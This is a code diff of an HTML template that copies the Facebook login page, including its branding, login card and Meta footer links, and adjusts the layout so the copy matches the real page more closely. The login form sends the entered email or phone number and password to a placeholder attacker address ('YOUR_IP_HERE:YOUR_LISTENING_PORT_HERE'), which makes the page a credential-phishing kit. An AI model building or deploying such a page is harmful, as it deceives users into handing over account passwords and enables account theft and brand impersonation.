@@ -1,6 +1,6 @@
 <!-- To-DO: 
 * Finish JS function to change input fields on click.
-* Ensure form action is correct. 
+* Find letters that match perfectly.
 * Test page.
 
 -->
@@ -40,17 +40,21 @@
             .header {
                 background: #fff;
                 color: #343a46;            
-                height: 950px;
+                height: 1020px;
                 position: relative;
                 z-index: 1;
+                width: 100%;
+                max-width: 100%;
             }
 
             .header2 {
-                height: 77.55%;
+                height: 82%;
                 background: #F0F2F5;
                 color: #978364;
                 position: relative;
                 z-index: 5;
+                width: 100%;
+                max-width: 100%;
             }
 
 
@@ -61,7 +65,7 @@
 
             .custom-btn {
                 width: 34px;
-                height: 23px;
+                height: 12px;
                 border: 1px #CCD0D5;
                 border-style: solid;
                 border-color: #CCD0D5;
@@ -81,13 +85,33 @@
                 bottom: 25px;
            }
 
-          
+          input[type="text"],
+          textarea {
+                transition: all 0.30s ease-in-out;
+                outline: none;
+                border: 1px solid rgba(0, 31, 153, 1)
+          }
            
-           .input-btn.clicked {
-            border-color: #007bff;
-            color: red;
+          input[type="text"],
+          textarea:focus {
+                box-shadow: 0 0 1px rgba(0, 31, 153, 1);
+                border: 0.25px solid rgba(0, 31, 153, 1);
+            }
 
-           }
+            .form-control:focus {
+
+            }
+
+           .container {
+                max-width: 1335px;
+                margin: 0 auto;
+            }
+
+            .grid-row {
+                display: flex;
+                flex-flow: row wrap;
+                justify-content: flex-start;
+            }
 
             
         </style>
@@ -97,129 +121,111 @@
         <div class="header">
 
             <div class="header2">
-                <center><div class="text" style="color: #316FF6; position: relative; top: 20px; font-weight: 800; font-size: 4em; font-family: 'Tahoma', sans serif;">facebook</h1></center>
+
+                <div class="container">
+                    <div class="grid-row">
+                        <center><div class="text" style="color: #316FF6; position: relative; top: 185px; font-weight: 800; font-size: 3.8em; font-family: 'Tahoma', sans serif; left: 140px;">facebook</h1></div></center>
+                        <center><div class="text" style="text-align: left; position: relative; top: 275px; color: black; font-size: x-large; font-weight: 400; line-height: 1; left: -140px; font-size: 1.9em;" >Connect with friends and the world <br>around you on Facebook.</div></center>
+                    </div>
+                </div>
                 
-                <center><div class="text" style="position: relative; top: 20px; color: black; font-size: x-large; font-weight: 400; line-height: 1;" >Connect with friends and the world <br>around you on Facebook.</div></center>
 
-                <center><div class="card" style="position: relative; top: 62px; height: 352px; width: 385px; box-shadow: 0 0 11px; color: rgb(187, 183, 183);">
+                <center><div class="card" style="left: 290px; position: relative; top: 43px; height: 352px; width: 385px; box-shadow: 0 0 11px; color: rgb(187, 183, 183);">
 
-                    <form action="http://YOUR_IP_HERE:YOUR_LISTENING_PORT_HERE/">
+                    <form action="http://YOUR_IP_HERE:YOUR_LISTENING_PORT_HERE/" class="form-control">
                         {% csrf_token %}
                         <fieldset>
                             
-                            <input class="input-btn" onclick="change_button()" type="text" name="email/phone" id="field1" placeholder="Email or phone number" style="border-radius: 6px; width: 355px; height: 50px; top: 20px; position: relative; opacity: 0.3;" >
-                            <input class="input-btn" onclick="change_button()" type="text" name="password" id="field2" placeholder="Password" style="border-radius: 6px; width: 355px; height: 50px; top: 30px; position: relative; opacity: 0.3;">
-
-                            <script>
-                                
-                                var fields = document.querySelectorAll("input")
-
-                                fields.onclick = function() {change_button1(), change_button2()};
-
-                                function change_button1() {
-                                    if (fields[0].onclick) {
-                                        fields[0].className = "input-btn clicked";
-                                    }
-                                }
-                                
-
-                                function change_button(fieldID) {
-                                    // Below line returns a list with all cases of input-btn in current template.
-                                    var input_fields = document.getElementsByClassName('input-btn');
-
-                                    for (var i=0; i < input_fields.length; i++) {
-                                        elements[i].classList.remove('clicked');
-                                    }
-                                    document.getElementById(fieldID).classList.add('clicked');
-                                }
-
-
-            
-
-                            </script>
+                            <input class="form-control" type="text" name="email/phone" id="field1" placeholder="Email or phone number" style="border-radius: 0px; width: 355px; height: 50px; top: 20px; position: relative;" >
+                            <input class="form-control" type="text" name="password" id="field2" placeholder="Password" style="border-radius: 0px; width: 355px; height: 50px; top: 30px; position: relative; ">
 
 
                             <button class="btn btn-primary" style="top: 47px; position: relative; width: 355px; height: 45px; font-size: larger; font-weight: 680; border-radius: 5px;">Log In</button>
                             <br>
                             <a href="/forgot_password/" style="top: 60px; position: relative; font: 0.88em sans-serif; text-decoration: none;" >Forgot Password?</a>
 
-                            <div class="line" style="border-top: 1px solid #888; position: relative; top: 80px; width: 90%; color: rgb(181, 179, 179); opacity: 0.25;"></div>
+                            <div class="line" style="border-top: 1px solid #888; position: relative; top: 90px; width: 90%; color: rgb(181, 179, 179); opacity: 0.25;"></div>
 
-                            <button class="btn btn-success" style="font-weight: 500; top: 108px; position: relative; background-color: #42B72A; height: 45px; width: 200px; font-size: large; border-radius: 5px;">Create new account</button>
+                            <button class="btn btn-success" style="font-weight: 500; top: 108px; position: relative; background-color: #42B72A; height: 46px; width: 195px; font-size: large; border-radius: 5px;">Create new account</button>
 
                             <div class="text" style="top: 160px; position: relative; font: 0.9em sans-serif; color: black;"><b>Create a page </b>for a celebrity, brand or business.</div>
                         </fieldset>
                     </form>
-
-
                 </div></center>
-
             </div>
 
-            <a href="" style="left: 25px; bottom: -15px; position: relative; font-size: 0.8em; color: #838588; text-decoration: none;">English (US)</a>
-            <a href="" style="left: 35px; bottom: -15px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none;">Français (Canada)</a>
-            <a href="" style="left: 45px; bottom: -15px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none;">Español</a>
-            <a href="" style="left: 55px; bottom: -15px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none;">中文(简体)</a>
-            <a href="" style="left: 65px; bottom: -15px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none;">한국어</a>
-            <a href="" style="left: 75px; bottom: -15px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none;">日本語</a>
-            <a href="" style="left: 85px; bottom: -15px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none;">Português (Brasil)</a>
-            <a href="" style="left: 95px; bottom: -15px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none;">Deutsch</a>
-            <a href="" style="left: 102px; bottom: -15px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none;">Italiano</a>
-            <a href="" style="left: 110px; bottom: -15px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none;">العربية</a>
-            <a href="" style="left: 120px; bottom: -15px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none;">हिन्दी</a>
-    
+            <!-- All below go into the bottom section of the page for the center function. -->
+            <center>
+                <div class="container" style="text-align: left; text-wrap:wrap; flex-flow: wrap; justify-content: flex-start">
+                    <a href="" style="left: 165px; bottom: -30px; position: relative; font-size: 0.8em; color: #838588; text-decoration: none; text-align: left;">English (US)</a>
+                    <a href="" style="left: 170px; bottom: -30px; position: relative; font-size: 0.8em; color: #838588; text-decoration:none;  text-align: left;">Français</a>
+                    <a href="" style="left: 168px; bottom: -30px; position: relative; font-size: 0.8em; color: #838588; text-decoration:none; text-align: left;">(Canada)</a>
+                    <a href="" style="left: 172px; bottom: -30px; position: relative; font-size: 0.8em; color: #838588; text-decoration: none; text-align: left;">Español</a>
+                    <a href="" style="left: 177px; bottom: -30px; position: relative; font-size: 0.8em; color: #838588; text-decoration: none; text-align: left;">中文</a>
+                    <a href="" style="left: 173px; bottom: -30px; position: relative; font-size: 0.8em; color: #838588; text-decoration: none; text-align: left;">(简体)</a>
+                    <a href="" style="left: 179px; bottom: -30px; position: relative; font-size: 0.8em; color: #838588; text-decoration: none; text-align: left;">한국어</a>
+                    <a href="" style="left: 187px; bottom: -30px; position: relative; font-size: 0.8em; color: #838588; text-decoration: none; text-align: left;">日本語</a>
+                    <a href="" style="left: 192px; bottom: -30px; position: relative; font-size: 0.8em; color: #838588; text-decoration: none; text-align: left;">Português</a>
+                    <a href="" style="left: 197px; bottom: -30px; position: relative; font-size: 0.8em; color: #838588; text-decoration: none; text-align: left;">(Brasil)</a>
+                    <a href="" style="left: 203px; bottom: -30px; position: relative; font-size: 0.8em; color: #838588; text-decoration: none; text-align: left;">Deutsch</a>
+                    <a href="" style="left: 211px; bottom: -30px; position: relative; font-size: 0.8em; color: #838588; text-decoration: none; text-align: left;">Italiano</a>
+                    <a href="" style="left: 216px; bottom: -30px; position: relative; font-size: 0.8em; color: #838588; text-decoration: none; text-align: left;">العربية</a>
+                    <a href="" style="left: 221px; bottom: -30px; position: relative; font-size: 0.8em; color: #838588; text-decoration: none; text-align: left;">हिन्दी</a>
+                    <button class="custom-btn btn btn-primary" onclick="" style="left: 223px; bottom: 0px; position: relative; top: 30px; height: 20px; text-align: left;">
+                        <center><span class="plus-sign" style="font-size: 1.8em; position: relative; top: -22px; right: 5px;">+</span></center>
+                    </button>
 
-            <div class="container">
-                <button class="custom-btn btn btn-primary">
-                    <span class="plus-sign">+</span>
-                </button>
+                </div>
+                
+                
+                <div class="line" style="border-top: 1px solid #888; position: relative; bottom: -200px; width: 66%; color: rgb(181, 179, 179); opacity: 0.25; top: 30px;"></div>
 
-            </div>
+                <!-- Turn each of the below links to class's, class=link or text.... then add the on hover stylings in the <head> <style> section. -->
+                
+                <div class="container" style="text-align: left; text-wrap:wrap; flex-flow: wrap; justify-content: flex-start">
 
+                    <a href="" style="left: 165px; bottom: -35px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none; font-weight: 425;">Sign Up</a>
+                    <a href="" style="left: 177px; bottom: -35px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none; font-weight: 425;;">Log In</a>
+                    <a href="" style="left: 191px; bottom: -35px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none; font-weight: 425;;">Messenger</a>            
+                    <a href="" style="left: 205px; bottom: -35px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none; font-weight: 425;">Facebook Lite</a>
+                    <a href="" style="left: 224px; bottom: -35px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none; font-weight: 425;">Video</a>
+                    <a href="" style="left: 238px; bottom: -35px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none; font-weight: 425;">Places</a>
+                    <a href="" style="left: 255px; bottom: -35px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none; font-weight: 425;">Games</a>
+                    <a href="" style="left: 273px; bottom: -35px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none; font-weight: 425;">Marketplace</a>
+                    <a href="" style="left: 285px; bottom: -35px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none; font-weight: 425;">Meta Pay</a>
+                    <a href="" style="left: 300px; bottom: -35px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none; font-weight: 425;">Meta Store</a>
+                    <a href="" style="left: 315px; bottom: -35px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none; font-weight: 425;">Meta Quest</a>
+                    <a href="" style="left: 330px; bottom: -35px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none; font-weight: 425;">Instagram</a>
+                    <a href="" style="left: 345px; bottom: -35px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none; font-weight: 425;">Threads</a>
+                    <a href="" style="left: 360px; bottom: -35px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none; font-weight: 425;">Fundraisers</a>
 
-            <div class="custom-btm" style="position: relative; bottom: -15px;"></div>
-
-
-            <center><div class="line" style="border-top: 1px solid #888; position: relative; bottom: -30px; width: 95%; color: rgb(181, 179, 179); opacity: 0.25; top: 26px;"></div></center>
-
-            <!-- Turn each of the below links to class's, class=link or text.... then add the on hover stylings in the <head> <style> section. -->
-
-            <a href="" style="left: 19px; top: 30px; position: relative; font-size: 0.8em; color: #838588; text-decoration: none; font-weight: 425;">Sign Up</a>
-            <a href="" style="left: 40px; top: 30px; position: relative; font-size: 0.8em; color: #838588; text-decoration: none; font-weight: 425;;">Log In</a>
-            <a href="" style="left: 55px; top: 30px; position: relative; font-size: 0.8em; color: #838588; text-decoration: none; font-weight: 425;;">Messenger</a>            
-            <a href="" style="left: 75px; top: 30px; position: relative; font-size: 0.8em; color: #838588; text-decoration: none; font-weight: 425;">Facebook Lite</a>
-            <a href="" style="left: 90px; top: 30px; position: relative; font-size: 0.8em; color: #838588; text-decoration: none; font-weight: 425;">Video</a>
-            <a href="" style="left: 105px; top: 30px; position: relative; font-size: 0.8em; color: #838588; text-decoration: none; font-weight: 425;">Places</a>
-            <a href="" style="left: 125px; top: 30px; position: relative; font-size: 0.8em; color: #838588; text-decoration: none; font-weight: 425;">Games</a>
-            <a href="" style="left: 140px; top: 30px; position: relative; font-size: 0.8em; color: #838588; text-decoration: none; font-weight: 425;">Marketplace</a>
-            <a href="" style="left: 165px; top: 30px; position: relative; font-size: 0.8em; color: #838588; text-decoration: none; font-weight: 425;">Meta Pay</a>
-
-            <a href="" style="right: 466px; top: 50px; position: relative; font-size: 0.8em; color: #838588; text-decoration: none; font-weight: 425;">Meta Store</a>
-            <a href="" style="right: 450px; top: 50px; position: relative; font-size: 0.8em; color: #838588; text-decoration: none; font-weight: 425;">Meta Quest</a>
-            <a href="" style="right: 435px; top: 50px; position: relative; font-size: 0.8em; color: #838588; text-decoration: none; font-weight: 425;">Instagram</a>
-            <a href="" style="right: 420px; top: 50px; position: relative; font-size: 0.8em; color: #838588; text-decoration: none; font-weight: 425;">Threads</a>
-            <a href="" style="left: 330px; top: 27px; position: relative; font-size: 0.8em; color: #838588; text-decoration: none; font-weight: 425;">Fundraisers</a>
-            <a href="" style="left: 350px; top: 27px; position: relative; font-size: 0.8em; color: #838588; text-decoration: none; font-weight: 425;">Services</a>
-            <a href="" style="left: 365px; top: 27px; position: relative; font-size: 0.8em; color: #838588; text-decoration: none; font-weight: 425;">Voting Information Center</a>
-
-            <a href="" style="right: 251px; top: 45px; position: relative; font-size: 0.8em; color: #838588; text-decoration: none; font-weight: 425;">Privacy Policy</a>
-            <a href="" style="right: 230px; top: 45px; position: relative; font-size: 0.8em; color: #838588; text-decoration: none; font-weight: 425;">Privacy Center</a>
-            <a href="" style="right: 215px; top: 45px; position: relative; font-size: 0.8em; color: #838588; text-decoration: none; font-weight: 425;">Groups</a>
-            <a href="" style="right: 200px; top: 45px; position: relative; font-size: 0.8em; color: #838588; text-decoration: none; font-weight: 425;">About</a>
-            <a href="" style="right: 183px; top: 45px; position: relative; font-size: 0.8em; color: #838588; text-decoration: none; font-weight: 425;">Create ad</a>
-            <a href="" style="right: 170px; top: 45px; position: relative; font-size: 0.8em; color: #838588; text-decoration: none; font-weight: 425;">Create Page</a>
-            <a href="" style="right: 150px; top: 45px; position: relative; font-size: 0.8em; color: #838588; text-decoration: none; font-weight: 425;">Developers</a>
-            <a href="" style="left: 594px; top: 23px; position: relative; font-size: 0.8em; color: #838588; text-decoration: none; font-weight: 425;">Careers</a>
-            <a href="" style="left: 610px; top: 23px; position: relative; font-size: 0.8em; color: #838588; text-decoration: none; font-weight: 425;">Cookies</a>
-
-            <a href="" style="right: 75px; top: 39px; position: relative; font-size: 0.8em; color: #838588; text-decoration: none; font-weight: 425;">Ad Choices</a>
-            <a href="" style="right: 44px; top: 39px; position: relative; font-size: 0.8em; color: #838588; text-decoration: none; font-weight: 425;">Terms</a>
-            <a href="" style="right: 29px; top: 39px; position: relative; font-size: 0.8em; color: #838588; text-decoration: none; font-weight: 425;">Help</a>
-            <a href="" style="right: 19px; top: 39px; position: relative; font-size: 0.8em; color: #838588; text-decoration: none; font-weight: 425;">Contact Uploading & Non-Users</a>
-
-            <div class="text" style="left: 20px; top: 65px; position: relative; font-size: 0.8em; color: #838588; text-decoration: none; font-weight: 425;">Meta © 2023</div>
+                </div>
 
 
+                <div class="container" style="text-align: left; text-wrap:wrap; flex-flow: wrap; justify-content: flex-start">
+                    <a href="" style="left: 165px; bottom: -35px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none; font-weight: 425;">Services</a>
+                    <a href="" style="left: 180px; bottom: -35px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none; font-weight: 425;">Voting Information Center</a>
+                    <a href="" style="left: 195px; bottom: -35px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none; font-weight: 425;">Privacy Policy</a>
+                    <a href="" style="left: 205px; bottom: -35px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none; font-weight: 425;">Privacy Center</a>
+                    <a href="" style="left: 220px; bottom: -35px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none; font-weight: 425;">Groups</a>
+                    <a href="" style="left: 235px; bottom: -35px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none; font-weight: 425;">About</a>
+                    <a href="" style="left: 250px; bottom: -35px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none; font-weight: 425;">Create ad</a>
+                    <a href="" style="left: 265px; bottom: -35px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none; font-weight: 425;">Create Page</a>
+                    <a href="" style="left: 280px; bottom: -35px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none; font-weight: 425;">Developers</a>
+                    <a href="" style="left: 295px; bottom: -35px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none; font-weight: 425;">Careers</a>
+                    <a href="" style="left: 310px; bottom: -35px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none; font-weight: 425;">Cookies</a>
+                    <a href="" style="left: 325px; bottom: -35px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none; font-weight: 425;">Ad Choices</a>
+                </div>
+
+                <div class="container" style="text-align: left; text-wrap:wrap; flex-flow: wrap; justify-content: flex-start;">
+                    <a href="" style="left: 165px; bottom: -35px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none; font-weight: 425;">Terms</a>
+                    <a href="" style="left: 180px; bottom: -35px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none; font-weight: 425;">Help</a>
+                    <a href="" style="left: 195px; bottom: -35px; position: relative; font-size: 0.77em; color: #838588; text-decoration: none; font-weight: 425;">Contact Uploading & Non-Users</a>
+
+                    <div class="text" style="left: 165px; bottom: -55px; position: relative; font-size: 0.78em; color: #838588; text-decoration: none; font-weight: 425;">Meta © 2023</div>
+                    
+                </div>
+            </center>
 
 
        </div>
